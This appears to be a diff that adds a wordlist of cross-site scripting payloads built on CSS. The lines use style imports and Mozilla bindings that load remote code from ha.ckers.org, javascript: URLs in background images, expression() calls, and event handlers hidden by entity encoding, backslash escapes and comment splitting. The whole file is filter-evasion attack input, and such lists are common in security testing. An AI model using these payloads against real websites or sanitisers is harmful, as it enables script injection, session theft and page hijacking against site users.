@@ -1,0 +1,23 @@
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;</style &#32;>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<div/style="width:expression(confirm(1))">X</div> 
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+ <STYLE>li {list-style-image: url(\”javascript:alert(‘XSS’)\”);}</STYLE>
+[color=red width=expression(alert(123))]
+[color] <BASE HREF=”javascript:alert(‘XSS’);//”>
+<DIV STYLE=”width: expression(alert(‘XSS’));”> 
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
+<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”> 
+<DIV STYLE=”width: expression(alert(‘XSS’));”>
